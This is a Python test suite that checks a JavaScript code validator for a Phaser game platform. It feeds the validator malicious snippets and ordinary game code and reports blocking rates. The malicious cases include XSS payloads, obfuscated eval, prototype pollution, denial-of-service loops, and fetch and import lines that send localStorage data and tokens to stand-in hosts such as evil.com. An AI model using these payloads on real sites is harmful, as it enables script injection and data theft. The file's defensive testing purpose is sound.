#!/usr/bin/env python3
"""
Comprehensive Security Validation Test Suite
============================================

This script runs extensive security tests against the code validation system
to ensure it properly blocks malicious code while allowing legitimate game code.

Usage:
    python security_test_runner.py [options]

Options:
    --malicious-only    Run only malicious code tests
    --benign-only      Run only benign code tests
    --verbose          Show detailed output
    --json             Output results in JSON format
    --export-report    Export detailed HTML report
"""

import sys
import os
import json
import argparse
from datetime import datetime
import importlib.util

# Add the app directory to the path to import our validator
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from app import EnhancedSecurityValidator
except ImportError:
    print("❌ Could not import EnhancedSecurityValidator from app.py")
    print("Make sure you're running this script from the PhaserGame directory")
    sys.exit(1)


class SecurityTestRunner:
    def __init__(self, verbose=False):
        self.validator = EnhancedSecurityValidator()
        self.verbose = verbose
        self.results = []
        
    def get_malicious_test_cases(self):
        """Return comprehensive malicious code test cases"""
        return [
            # Direct code injection attacks
            {
                "name": "Direct eval injection",
                "code": 'eval("alert(\\"XSS Attack\\")")',
                "category": "Code Injection",
                "severity": "CRITICAL",
                "description": "Direct use of eval() function to execute arbitrary code"
            },
            {
                "name": "Function constructor injection",
                "code": 'new Function("alert(\\"XSS\\"); return 42")()',
                "category": "Code Injection", 
                "severity": "CRITICAL",
                "description": "Using Function constructor to create and execute malicious code"
            },
            {
                "name": "Indirect eval via window",
                "code": 'window["eval"]("console.log(\\"bypassed security\\")")',
                "category": "Code Injection",
                "severity": "CRITICAL", 
                "description": "Attempting to bypass eval detection using bracket notation"
            },
            {
                "name": "Variable-based eval",
                "code": 'var x = eval; x("alert(\\"Variable eval bypass\\")")',
                "category": "Code Injection",
                "severity": "CRITICAL",
                "description": "Storing eval in variable to bypass detection"
            },
            {
                "name": "Hidden Function constructor",
                "code": 'var F = Function; F("console.log(\\"Hidden Function\\")")();',
                "category": "Code Injection",
                "severity": "CRITICAL",
                "description": "Storing Function constructor in variable"
            },
            
            # Timer-based injection
            {
                "name": "setTimeout string injection",
                "code": 'setTimeout("alert(\\"Timer XSS\\")", 1000)',
                "category": "Timer Injection",
                "severity": "HIGH",
                "description": "Using setTimeout with string parameter to execute code"
            },
            {
                "name": "setInterval string injection", 
                "code": 'setInterval("console.log(\\"Interval attack\\")", 5000)',
                "category": "Timer Injection",
                "severity": "HIGH",
                "description": "Using setInterval with string parameter"
            },
            
            # DOM manipulation attacks
            {
                "name": "document.write injection",
                "code": 'document.write("<script>alert(\\"DOM XSS\\")</script>")',
                "category": "DOM Manipulation",
                "severity": "HIGH",
                "description": "Injecting script tags via document.write"
            },
            {
                "name": "document.writeln injection",
                "code": 'document.writeln("<img src=x onerror=alert(\\"DOM XSS\\")>")',
                "category": "DOM Manipulation", 
                "severity": "HIGH",
                "description": "Using document.writeln to inject malicious HTML"
            },
            {
                "name": "innerHTML script injection",
                "code": 'document.body.innerHTML = "<script>alert(\\"innerHTML XSS\\")</script>"',
                "category": "DOM Manipulation",
                "severity": "HIGH", 
                "description": "Injecting scripts via innerHTML"
            },
            {
                "name": "head innerHTML injection",
                "code": 'document.head.innerHTML += "<script src=\\"http://evil.com/malicious.js\\"></script>"',
                "category": "DOM Manipulation",
                "severity": "HIGH",
                "description": "Injecting external scripts via head innerHTML"
            },
            
            # Prototype pollution attacks
            {
                "name": "Object prototype pollution",
                "code": 'Object.prototype.isAdmin = true; Object.prototype.permissions = "admin";',
                "category": "Prototype Pollution",
                "severity": "HIGH",
                "description": "Polluting Object prototype with admin properties"
            },
            {
                "name": "__proto__ manipulation",
                "code": 'var obj = {}; obj.__proto__.polluted = true; obj.__proto__.exploit = function() { return "pwned"; };',
                "category": "Prototype Pollution",
                "severity": "HIGH", 
                "description": "Direct __proto__ manipulation to add malicious properties"
            },
            {
                "name": "Constructor prototype access",
                "code": 'var x = {}; x.constructor.prototype.evil = function() { alert("Constructor pollution"); };',
                "category": "Prototype Pollution",
                "severity": "HIGH",
                "description": "Accessing constructor.prototype to add malicious methods"
            },
            
            # Global object access
            {
                "name": "Window location hijacking",
                "code": 'window.location = "javascript:alert(\\"Location XSS\\")"',
                "category": "Global Access",
                "severity": "HIGH",
                "description": "Hijacking window.location for javascript: URLs"
            },
            {
                "name": "Self location redirect",
                "code": 'self.location = "http://evil.com/steal-data"',
                "category": "Global Access",
                "severity": "HIGH",
                "description": "Using self.location to redirect to malicious site"
            },
            {
                "name": "Top frame access",
                "code": 'top.location = "http://attacker.com"',
                "category": "Global Access", 
                "severity": "HIGH",
                "description": "Attempting to control top frame location"
            },
            {
                "name": "Global this exploitation",
                "code": '(function() { return this; })().eval("alert(\\"Global this XSS\\")")',
                "category": "Global Access",
                "severity": "CRITICAL",
                "description": "Using function context to access global this"
            },
            
            # Storage manipulation
            {
                "name": "localStorage data theft",
                "code": 'localStorage.setItem("stolen", document.cookie); fetch("http://evil.com?data=" + localStorage.getItem("token"));',
                "category": "Storage Access",
                "severity": "MEDIUM",
                "description": "Stealing data from localStorage"
            },
            {
                "name": "sessionStorage manipulation",
                "code": 'sessionStorage.clear(); sessionStorage.setItem("admin", "true");',
                "category": "Storage Access",
                "severity": "MEDIUM", 
                "description": "Manipulating sessionStorage for privilege escalation"
            },
            
            # Network/Import attacks
            {
                "name": "Dynamic import attack",
                "code": 'import("http://evil.com/malicious-module.js").then(module => module.exploit())',  
                "category": "Network Access",
                "severity": "HIGH",
                "description": "Dynamically importing malicious external modules"
            },
            {
                "name": "Fetch data exfiltration",
                "code": 'fetch("http://evil.com/steal", { method: "POST", body: JSON.stringify({data: localStorage}) })',
                "category": "Network Access",
                "severity": "HIGH",
                "description": "Using fetch to exfiltrate data to external server"
            },
            {
                "name": "XMLHttpRequest attack",
                "code": 'var xhr = new XMLHttpRequest(); xhr.open("GET", "http://evil.com/payload"); xhr.send();',
                "category": "Network Access",
                "severity": "HIGH",
                "description": "Using XMLHttpRequest to communicate with malicious server"
            },
            
            # Obfuscation techniques
            {
                "name": "String concatenation obfuscation",
                "code": 'var e = "e"; var v = "v"; var a = "a"; var l = "l"; window[e+v+a+l]("alert(\\"Obfuscated\\")")',
                "category": "Obfuscation",
                "severity": "HIGH",
                "description": "Using string concatenation to obfuscate eval call"
            },
            {
                "name": "Unicode escape obfuscation",
                "code": '\\u0065\\u0076\\u0061\\u006c("\\u0061\\u006c\\u0065\\u0072\\u0074(\\"Unicode XSS\\")")',
                "category": "Obfuscation", 
                "severity": "HIGH",
                "description": "Using Unicode escapes to obfuscate malicious code"
            },
            {
                "name": "Hex escape obfuscation",
                "code": '\\x65\\x76\\x61\\x6c("\\x61\\x6c\\x65\\x72\\x74(\\"Hex XSS\\")")',
                "category": "Obfuscation",
                "severity": "HIGH", 
                "description": "Using hex escapes to hide malicious patterns"
            },
            {
                "name": "Base64 decode injection",
                "code": 'eval(atob("YWxlcnQoIkJhc2U2NCBYU1MiKQ=="))', // alert("Base64 XSS")
                "category": "Obfuscation",
                "severity": "HIGH",
                "description": "Using Base64 encoding to hide malicious payload"
            },
            
            # Resource exhaustion
            {
                "name": "Infinite loop DoS",
                "code": 'while(true) { console.log("DoS attack"); }',
                "category": "Resource Exhaustion",
                "severity": "MEDIUM",
                "description": "Infinite loop to cause denial of service"
            },
            {
                "name": "Memory exhaustion attack",
                "code": 'var arr = []; while(true) { arr.push(new Array(1000000).fill("x")); }',
                "category": "Resource Exhaustion", 
                "severity": "MEDIUM",
                "description": "Rapidly allocating memory to crash the application"
            },
            {
                "name": "Recursive function bomb",
                "code": 'function bomb() { bomb(); bomb(); } bomb();',
                "category": "Resource Exhaustion",
                "severity": "MEDIUM",
                "description": "Exponential recursion to exhaust call stack"
            },
            
            # Advanced evasion techniques
            {
                "name": "toString method override",
                "code": 'var obj = {toString: function() { return "alert(\\"toString XSS\\")"; }}; eval(obj);',
                "category": "Advanced Evasion",
                "severity": "HIGH",
                "description": "Overriding toString to inject code when object is coerced"
            },
            {
                "name": "valueOf method exploitation",
                "code": 'var obj = {valueOf: function() { eval("alert(\\"valueOf XSS\\")"); return 1; }}; +obj;',
                "category": "Advanced Evasion",
                "severity": "HIGH",
                "description": "Using valueOf method to execute code during type coercion"
            },
            {
                "name": "Symbol.toPrimitive exploitation",
                "code": 'var obj = {[Symbol.toPrimitive]: function() { eval("alert(\\"Symbol XSS\\")"); return 1; }}; +obj;',
                "category": "Advanced Evasion", 
                "severity": "HIGH",
                "description": "Using Symbol.toPrimitive for code execution"
            },
            {
                "name": "Proxy handler injection",
                "code": 'var handler = { get: function() { eval("alert(\\"Proxy XSS\\")"); return function(){}; } }; var p = new Proxy({}, handler); p.anything;',
                "category": "Advanced Evasion",
                "severity": "HIGH",
                "description": "Using Proxy handlers to intercept property access"
            }
        ]
    
    def get_benign_test_cases(self):
        """Return legitimate game development code that should pass validation"""
        return [
            # Basic function declarations
            {
                "name": "Simple function declaration",
                "code": 'function createPlayer(x, y) { return { x: x, y: y, health: 100, score: 0 }; }',
                "category": "Safe Functions",
                "description": "Standard function declaration for game logic"
            },
            {
                "name": "Arrow function definition",
                "code": 'const movePlayer = (player, dx, dy) => { player.x += dx; player.y += dy; };',
                "category": "Safe Functions", 
                "description": "Modern arrow function syntax"
            },
            {
                "name": "Method definition",
                "code": 'var gameObject = { update: function() { this.x += this.velocity; }, render: function(ctx) { ctx.fillRect(this.x, this.y, 32, 32); } };',
                "category": "Safe Functions",
                "description": "Object method definitions for game entities"
            },
            
            # Phaser.js game code
            {
                "name": "Basic Phaser game setup",
                "code": '''var config = {
    type: Phaser.AUTO,
    width: 800,
    height: 600,
    scene: {
        preload: function() { this.load.image('player', 'assets/player.png'); },
        create: function() { this.player = this.add.sprite(400, 300, 'player'); },
        update: function() { if (this.input.keyboard.isDown('LEFT')) this.player.x -= 5; }
    }
};
var game = new Phaser.Game(config);''',
                "category": "Safe Game Code",
                "description": "Standard Phaser.js game initialization"
            },
            {
                "name": "Phaser scene with physics",
                "code": '''var GameScene = new Phaser.Class({
    Extends: Phaser.Scene,
    initialize: function() { Phaser.Scene.call(this, { key: 'GameScene' }); },
    create: function() {
        this.physics.world.setBounds(0, 0, 800, 600);
        this.player = this.physics.add.sprite(100, 450, 'player');
        this.player.setBounce(0.2);
        this.player.setCollideWorldBounds(true);
    }
});''',
                "category": "Safe Game Code", 
                "description": "Phaser scene class with physics setup"
            },
            
            # Safe timer usage
            {
                "name": "setTimeout with function reference",
                "code": 'setTimeout(function() { console.log("Game timer tick"); updateGameState(); }, 1000);',
                "category": "Safe Timers",
                "description": "Using setTimeout with function reference (not string)"
            },
            {
                "name": "setInterval for game loop",
                "code": 'var gameLoop = setInterval(() => { update(); render(); }, 16);',
                "category": "Safe Timers",
                "description": "60 FPS game loop using setInterval with arrow function"
            },
            {
                "name": "requestAnimationFrame loop",
                "code": '''function gameLoop() {
    update();
    render();
    requestAnimationFrame(gameLoop);
}
gameLoop();''',
                "category": "Safe Timers",
                "description": "Modern game loop using requestAnimationFrame"
            },
            
            # Object and array manipulation
            {
                "name": "Object property assignment",
                "code": 'var player = {}; player.health = 100; player.score = 0; player.inventory = ["sword", "potion"];',
                "category": "Safe Objects",
                "description": "Basic object property manipulation"
            },
            {
                "name": "Array operations",
                "code": 'var enemies = []; enemies.push({x: 100, y: 100, health: 50}); enemies.forEach(enemy => enemy.update());',
                "category": "Safe Objects",
                "description": "Array manipulation for game entities"
            },
            {
                "name": "Object destructuring",
                "code": 'var {x, y, width, height} = player.getBounds(); var collision = checkCollision(x, y, width, height);',
                "category": "Safe Objects",
                "description": "Modern destructuring assignment"
            },
            
            # Mathematical operations
            {
                "name": "Distance calculation",
                "code": 'var distance = Math.sqrt(Math.pow(player.x - enemy.x, 2) + Math.pow(player.y - enemy.y, 2));',
                "category": "Safe Math",
                "description": "Standard distance formula calculation"
            },
            {
                "name": "Angle calculation",
                "code": 'var angle = Math.atan2(target.y - player.y, target.x - player.x); var degrees = angle * 180 / Math.PI;',
                "category": "Safe Math",
                "description": "Angle calculation for game mechanics"
            },
            {
                "name": "Random number generation",
                "code": 'var randomX = Math.random() * canvas.width; var randomY = Math.random() * canvas.height;',
                "category": "Safe Math", 
                "description": "Random position generation"
            },
            
            # Control flow and logic
            {
                "name": "Conditional game logic",
                "code": '''if (player.health <= 0) {
    gameOver();
} else if (player.health < 20) {
    showLowHealthWarning();
} else {
    continueGame();
}''',
                "category": "Safe Logic",
                "description": "Conditional logic for game states"
            },
            {
                "name": "Switch statement for input",
                "code": '''switch(inputKey) {
    case 'ArrowUp': player.y -= player.speed; break;
    case 'ArrowDown': player.y += player.speed; break;
    case 'ArrowLeft': player.x -= player.speed; break;
    case 'ArrowRight': player.x += player.speed; break;
    default: break;
}''',
                "category": "Safe Logic",
                "description": "Input handling with switch statement"
            },
            {
                "name": "For loop iteration",
                "code": 'for (var i = 0; i < enemies.length; i++) { if (enemies[i].health <= 0) { enemies.splice(i, 1); i--; } }',
                "category": "Safe Logic",
                "description": "Loop for processing game entities"
            },
            
            # Event handling
            {
                "name": "Event listener setup",
                "code": '''document.addEventListener('keydown', function(event) {
    if (event.key === 'Space') {
        player.jump();
    }
});''',
                "category": "Safe Events",
                "description": "Standard event listener for user input"
            },
            {
                "name": "Canvas mouse events",
                "code": '''canvas.addEventListener('click', function(event) {
    var rect = canvas.getBoundingClientRect();
    var x = event.clientX - rect.left;  
    var y = event.clientY - rect.top;
    handleClick(x, y);
});''',
                "category": "Safe Events", 
                "description": "Mouse click handling for canvas games"
            }
        ]
    
    def run_test(self, test_case, should_fail=True):
        """Run a single test case and return detailed results"""
        start_time = datetime.now()
        
        try:
            validation_result = self.validator.validate(test_case['code'])
            execution_time = (datetime.now() - start_time).total_seconds() * 1000  # ms
            
            # Determine if the test passed
            is_blocked = not validation_result['is_safe']
            test_passed = (should_fail and is_blocked) or (not should_fail and not is_blocked)
            
            result = {
                'name': test_case['name'],
                'category': test_case['category'],
                'should_fail': should_fail,
                'is_blocked': is_blocked,
                'test_passed': test_passed,
                'execution_time_ms': execution_time,
                'violations': validation_result.get('violations', []),
                'warnings': validation_result.get('warnings', []),
                'entropy_score': validation_result.get('entropy_score', 0),
                'code_size': validation_result.get('code_size', 0),
                'severity': test_case.get('severity', 'MEDIUM'),
                'description': test_case.get('description', ''),
                'code_sample': test_case['code'][:100] + '...' if len(test_case['code']) > 100 else test_case['code']
            }
            
            if self.verbose:
                status = "✅ PASS" if test_passed else "❌ FAIL"
                expected = "BLOCK" if should_fail else "ALLOW"
                actual = "BLOCKED" if is_blocked else "ALLOWED"
                print(f"{status} [{test_case['category']}] {test_case['name']}")
                print(f"   Expected: {expected}, Actual: {actual}")
                if not test_passed:
                    print(f"   ⚠️  {'CRITICAL SECURITY GAP' if should_fail and not is_blocked else 'FALSE POSITIVE'}")
                if validation_result.get('violations'):
                    print(f"   Violations: {len(validation_result['violations'])}")
            
            return result
            
        except Exception as e:
            return {
                'name': test_case['name'],
                'category': test_case['category'], 
                'should_fail': should_fail,
                'is_blocked': True,  # Exception means it was blocked
                'test_passed': should_fail,  # If it should fail, exception is good
                'execution_time_ms': (datetime.now() - start_time).total_seconds() * 1000,
                'error': str(e),
                'severity': test_case.get('severity', 'MEDIUM'),
                'description': test_case.get('description', ''),
                'code_sample': test_case['code'][:100] + '...' if len(test_case['code']) > 100 else test_case['code']
            }
    
    def run_malicious_tests(self):
        """Run all malicious code tests"""
        if self.verbose:
            print("\n🚨 RUNNING MALICIOUS CODE TESTS")
            print("=" * 50)
        
        malicious_tests = self.get_malicious_test_cases()
        malicious_results = []
        
        for test_case in malicious_tests:
            result = self.run_test(test_case, should_fail=True)
            malicious_results.append(result)
            self.results.append(result)
            
        return malicious_results
    
    def run_benign_tests(self):
        """Run all benign code tests"""
        if self.verbose:
            print("\n✅ RUNNING BENIGN CODE TESTS")
            print("=" * 50)
        
        benign_tests = self.get_benign_test_cases()
        benign_results = []
        
        for test_case in benign_tests:
            result = self.run_test(test_case, should_fail=False)
            benign_results.append(result)
            self.results.append(result)
            
        return benign_results
    
    def generate_report(self):
        """Generate comprehensive test report"""
        if not self.results:
            return {"error": "No test results available"}
        
        # Calculate statistics
        total_tests = len(self.results)
        passed_tests = len([r for r in self.results if r['test_passed']])
        failed_tests = total_tests - passed_tests
        
        malicious_tests = [r for r in self.results if r['should_fail']]
        benign_tests = [r for r in self.results if not r['should_fail']]
        
        malicious_blocked = len([r for r in malicious_tests if r['is_blocked']])
        benign_allowed = len([r for r in benign_tests if not r['is_blocked']])
        
        # Critical security gaps (malicious code that wasn't blocked)
        critical_gaps = [r for r in malicious_tests if not r['is_blocked']]
        
        # False positives (benign code that was blocked)
        false_positives = [r for r in benign_tests if r['is_blocked']]
        
        # Group results by category
        categories = {}
        for result in self.results:
            category = result['category']
            if category not in categories:
                categories[category] = {'total': 0, 'passed': 0, 'failed': 0}
            categories[category]['total'] += 1
            if result['test_passed']:
                categories[category]['passed'] += 1
            else:
                categories[category]['failed'] += 1
        
        # Calculate average execution time
        avg_execution_time = sum(r['execution_time_ms'] for r in self.results) / len(self.results)
        
        report = {
            'timestamp': datetime.now().isoformat(),
            'summary': {
                'total_tests': total_tests,
                'passed_tests': passed_tests,
                'failed_tests': failed_tests,
                'success_rate': (passed_tests / total_tests * 100) if total_tests else 0,
                'avg_execution_time_ms': avg_execution_time
            },
            'security_effectiveness': {
                'malicious_tests': len(malicious_tests),
                'malicious_blocked': malicious_blocked,
                'malicious_block_rate': (malicious_blocked / len(malicious_tests) * 100) if malicious_tests else 0,
                'critical_gaps': len(critical_gaps)
            },
            'false_positive_analysis': {
                'benign_tests': len(benign_tests),
                'benign_allowed': benign_allowed,
                'benign_allow_rate': (benign_allowed / len(benign_tests) * 100) if benign_tests else 0,
                'false_positives': len(false_positives)
            },
            'category_breakdown': categories,
            'critical_security_gaps': [
                {
                    'name': gap['name'],
                    'category': gap['category'],
                    'severity': gap['severity'],
                    'description': gap['description'],
                    'code_sample': gap['code_sample']
                }
                for gap in critical_gaps
            ],
            'false_positives_detail': [
                {
                    'name': fp['name'], 
                    'category': fp['category'],
                    'description': fp['description'],
                    'violations': fp.get('violations', []),
                    'code_sample': fp['code_sample']
                }
                for fp in false_positives
            ],
            'detailed_results': self.results
        }
        
        return report
    
    def print_summary_report(self, report):
        """Print a human-readable summary of the test results"""
        print("\n" + "="*60)
        print("🔒 SECURITY VALIDATION TEST REPORT")
        print("="*60)
        
        summary = report['summary']
        security = report['security_effectiveness']
        false_pos = report['false_positive_analysis']
        
        print(f"\n📊 OVERALL RESULTS:")
        print(f"   Total Tests: {summary['total_tests']}")
        print(f"   Passed: {summary['passed_tests']} ({summary['success_rate']:.1f}%)")
        print(f"   Failed: {summary['failed_tests']}")
        print(f"   Avg Execution Time: {summary['avg_execution_time_ms']:.2f}ms")
        
        print(f"\n🚨 SECURITY EFFECTIVENESS:")
        print(f"   Malicious Code Blocked: {security['malicious_blocked']}/{security['malicious_tests']} ({security['malicious_block_rate']:.1f}%)")
        print(f"   Critical Security Gaps: {security['critical_gaps']}")
        
        print(f"\n✅ FALSE POSITIVE ANALYSIS:")
        print(f"   Benign Code Allowed: {false_pos['benign_allowed']}/{false_pos['benign_tests']} ({false_pos['benign_allow_rate']:.1f}%)")
        print(f"   False Positives: {false_pos['false_positives']}")
        
        if report['critical_security_gaps']:
            print(f"\n🚨 CRITICAL SECURITY GAPS:")
            for gap in report['critical_security_gaps']:
                print(f"   ❌ {gap['name']} ({gap['severity']})")
                print(f"      Category: {gap['category']}")
                print(f"      Issue: {gap['description']}")
                print()
        
        if report['false_positives_detail']:
            print(f"\n⚠️  FALSE POSITIVES:")
            for fp in report['false_positives_detail']:
                print(f"   🔸 {fp['name']}")
                print(f"      Category: {fp['category']}")
                print(f"      Violations: {', '.join(fp['violations'])}")
                print()
        
        print(f"\n📋 CATEGORY BREAKDOWN:")
        for category, stats in report['category_breakdown'].items():
            success_rate = (stats['passed'] / stats['total'] * 100) if stats['total'] else 0
            print(f"   {category}: {stats['passed']}/{stats['total']} ({success_rate:.1f}%)")
        
        # Security assessment
        overall_security_score = (security['malicious_block_rate'] + false_pos['benign_allow_rate']) / 2
        
        print(f"\n🎯 SECURITY ASSESSMENT:")
        if overall_security_score >= 95:
            print("   ✅ EXCELLENT - Security validation is highly effective")
        elif overall_security_score >= 85:
            print("   ✅ GOOD - Security validation is effective with minor issues")
        elif overall_security_score >= 70:
            print("   ⚠️  MODERATE - Security validation needs improvement")
        else:
            print("   ❌ POOR - Security validation has significant gaps")
        
        print(f"   Overall Security Score: {overall_security_score:.1f}%")
        
        if security['critical_gaps'] > 0:
            print(f"   ⚠️  {security['critical_gaps']} critical security gap(s) detected!")
        
        print("\n" + "="*60)


def main():
    parser = argparse.ArgumentParser(description='Run comprehensive security validation tests')
    parser.add_argument('--malicious-only', action='store_true', help='Run only malicious code tests')
    parser.add_argument('--benign-only', action='store_true', help='Run only benign code tests')  
    parser.add_argument('--verbose', action='store_true', help='Show detailed output')
    parser.add_argument('--json', action='store_true', help='Output results in JSON format')
    parser.add_argument('--export-report', metavar='FILE', help='Export detailed HTML report to file')
    
    args = parser.parse_args()
    
    # Initialize test runner
    runner = SecurityTestRunner(verbose=args.verbose)
    
    print("🔒 Starting Security Validation Test Suite...")
    print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    # Run tests based on arguments
    if args.malicious_only:
        runner.run_malicious_tests()
    elif args.benign_only:
        runner.run_benign_tests()
    else:
        runner.run_malicious_tests()
        runner.run_benign_tests()
    
    # Generate report
    report = runner.generate_report()
    
    if args.json:
        print(json.dumps(report, indent=2))
    else:
        runner.print_summary_report(report)
    
    # Export HTML report if requested
    if args.export_report:
        try:
            html_report = generate_html_report(report)
            with open(args.export_report, 'w', encoding='utf-8') as f:
                f.write(html_report)
            print(f"\n📄 Detailed HTML report exported to: {args.export_report}")
        except Exception as e:
            print(f"❌ Failed to export HTML report: {e}")
    
    # Exit with error code if there are critical security gaps
    if report['security_effectiveness']['critical_gaps'] > 0:
        print(f"\n❌ Exiting with error code due to {report['security_effectiveness']['critical_gaps']} critical security gap(s)")
        sys.exit(1)


def generate_html_report(report):
    """Generate detailed HTML report"""
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Security Validation Test Report</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
            .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }}
            .header {{ text-align: center; margin-bottom: 30px; }}
            .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }}
            .stat-card {{ background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: center; }}
            .stat-value {{ font-size: 2em; font-weight: bold; color: #007bff; }}
            .critical {{ background: #ffe6e6; border-left: 5px solid #dc3545; }}
            .warning {{ background: #fff3cd; border-left: 5px solid #ffc107; }}
            .success {{ background: #d4edda; border-left: 5px solid #28a745; }}
            .test-result {{ margin: 10px 0; padding: 15px; border-radius: 5px; }}
            .pass {{ background: #d4edda; }}
            .fail {{ background: #f8d7da; }}
            .code-sample {{ background: #f8f9fa; padding: 10px; font-family: monospace; font-size: 0.9em; border-radius: 4px; margin: 5px 0; }}
            table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
            th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
            th {{ background-color: #f8f9fa; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔒 Security Validation Test Report</h1>
                <p>Generated: {report['timestamp']}</p>
            </div>
            
            <div class="summary">
                <div class="stat-card">
                    <div class="stat-value">{report['summary']['total_tests']}</div>
                    <div>Total Tests</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">{report['summary']['success_rate']:.1f}%</div>
                    <div>Success Rate</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">{report['security_effectiveness']['malicious_block_rate']:.1f}%</div>
                    <div>Malicious Blocked</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">{report['false_positive_analysis']['benign_allow_rate']:.1f}%</div>
                    <div>Benign Allowed</div>
                </div>
            </div>
    """
    
    # Add critical gaps section
    if report['critical_security_gaps']:
        html += '<div class="critical"><h3>🚨 Critical Security Gaps</h3>'
        for gap in report['critical_security_gaps']:
            html += f'''
            <div class="test-result fail">
                <h4>{gap['name']} ({gap['severity']})</h4>
                <p><strong>Category:</strong> {gap['category']}</p>
                <p><strong>Issue:</strong> {gap['description']}</p>
                <div class="code-sample">{gap['code_sample']}</div>
            </div>
            '''
        html += '</div>'
    
    # Add detailed results table
    html += '''
            <h3>📋 Detailed Test Results</h3>
            <table>
                <tr>
                    <th>Test Name</th>
                    <th>Category</th>
                    <th>Expected</th>
                    <th>Actual</th>
                    <th>Result</th>
                    <th>Execution Time</th>
                </tr>
    '''
    
    for result in report['detailed_results']:
        expected = "BLOCK" if result['should_fail'] else "ALLOW"
        actual = "BLOCKED" if result['is_blocked'] else "ALLOWED"
        status = "PASS" if result['test_passed'] else "FAIL"
        row_class = "pass" if result['test_passed'] else "fail"
        
        html += f'''
                <tr class="{row_class}">
                    <td>{result['name']}</td>
                    <td>{result['category']}</td>
                    <td>{expected}</td>
                    <td>{actual}</td>
                    <td>{status}</td>
                    <td>{result['execution_time_ms']:.2f}ms</td>
                </tr>
        '''
    
    html += '''
            </table>
        </div>
    </body>
    </html>
    '''
    
    return html


if __name__ == "__main__":
    main()
